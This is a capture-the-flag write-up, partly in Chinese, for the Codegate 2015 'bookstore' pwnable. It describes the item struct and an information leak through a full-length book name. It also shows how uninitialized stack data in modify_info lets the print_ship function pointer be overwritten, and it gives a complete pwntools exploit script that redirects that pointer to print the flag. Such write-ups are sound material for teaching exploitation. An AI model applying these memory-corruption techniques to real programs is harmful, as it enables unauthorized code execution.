0x00 题目
https://github.com/ctfs/write-ups-2015/blob/master/codegate-ctf-2015/pwnable/bookstore/bookstore

0x01 analysis
其中的项目类似如下结构体
struct item{
int num; #0
int type; #4
char name[20]; #8
int price; #28
int stock; #32
p_print_desp; #36
int ship; #40 1:freeshipping
p_print_ship #44
int download; #48
int isavaliable; #52 1:avaliable
char desp[300]; #56
} #356
1.修改name为20个字母可泄露程序装载基址
2.modify_info函数在不需要ship时仍然拷贝栈上的内容,可导致print_ship函数指针随意
3.可以使用上一次的栈帧的内容来将print_ship函数指针位置的内容改为print_flag的地址，地址可以由泄露的地址算出

from pwn import *
from binascii import *

r = process("./bookstore")  
#r = remote("192.168.56.102", 6666)  


def login():  
    print r.recvuntil("Input Your ID :")  
    r.sendline("helloadmin")  
    print r.recvuntil("Input Your PASSWORD :")  
    r.sendline("iulover!@#$")  

def additem(name, desp, type):  
    print r.recvuntil(">")  
    r.sendline("1")  
    print r.recvuntil("Input Bookname :")  
    r.sendline(name)  
    print r.recvuntil("Input Description :")  
    r.sendline(desp)  
    print r.recvuntil("Type (0 : Book, 1 : EBook)")  
    r.sendline(type)  

def modname(name):  
    print r.recvuntil(">")  
    r.sendline("2")  
    print r.recvuntil("Input No :")  
    r.sendline("0")  
    print r.recvuntil("0. Back to main menu!")  
    r.sendline("1")  
    print r.recvuntil("Input new bookname")  
    r.sendline(name)  
    print r.recvuntil("0. Back to main menu!")  
    r.sendline("0")  


def modinfo(name, ship):  
    print r.recvuntil(">")  
    r.sendline("2")  
    print r.recvuntil("Input No :")  
    r.sendline("0")  
    print r.recvuntil("0. Back to main menu!")  
    r.sendline("3")  
    print r.recvuntil("Input Stock :")  
    r.sendline(str(0x20ffffff))  
    print r.recvuntil("Input Price :")  
    r.sendline(str(0x20ffffff))  
    print r.recvuntil("Set Free Shipping? (1 : free shipping | 0 : not)")  
    r.sendline(ship)  
    print r.recvuntil("Set Avaliable :")  
    r.sendline("1")  
    print r.recvuntil("Input new bookname")  
    r.sendline(name)  
    print r.recvuntil("Input new description")  
    r.sendline("/home/bookstore/flag")  
    print r.recvuntil("0. Back to main menu!")  
    r.sendline("0")  

def leakmem():  
    print r.recvuntil(">")  
    r.sendline("4")  
    data = r.recvuntil("stock")  
    print data  
    start = data.find("NNN")  
    end = data.find("description")  
    print '--------------------'  
    print b2a_hex(data[start +28: start + 32])  
    print b2a_hex(data[start : end])  
    print '--------------------'  
    data = data[start + 28: start + 32]  
    return u32(data)  


def modname(name):  
    print r.recvuntil(">")  
    r.sendline("2")  
    print r.recvuntil("Input No :")  
    r.sendline("0")  
    print r.recvuntil("0. Back to main menu!")  
    r.sendline("1")  
    print r.recvuntil("Input new bookname")  
    r.sendline(name)  
    print r.recvuntil("0. Back to main menu!")  
    r.sendline("0")  

def modship():  
    print r.recvuntil(">")  
    r.sendline("2")  
    print r.recvuntil("Input No :")  
    r.sendline("0")  
    print r.recvuntil("0. Back to main menu!")  
    r.sendline("4")  
    print r.recvuntil("Modify Free-shipping? (0. not | 1. free shipping)")  
    r.sendline("1")  
    print r.recvuntil("0. Back to main menu!")  
    r.sendline("0")  

def viewinfo():  
    print r.recvuntil(">")  
    r.sendline("3")  
    print r.recvuntil("Input No :")  
    r.sendline("0")  

def exp():  
    login()  
    additem("namename", "despdesp", '0')  
    modinfo("N"*20, "0")  
    print_desp_addr  = leakmem()  
    print_desp_addr += ( 0x8DB- 0x9AD)  
    modname( p32(print_desp_addr) * 123)  
    modinfo("/home/bookstore/key\x00","0")  
    modship()  
    viewinfo()  

exp()
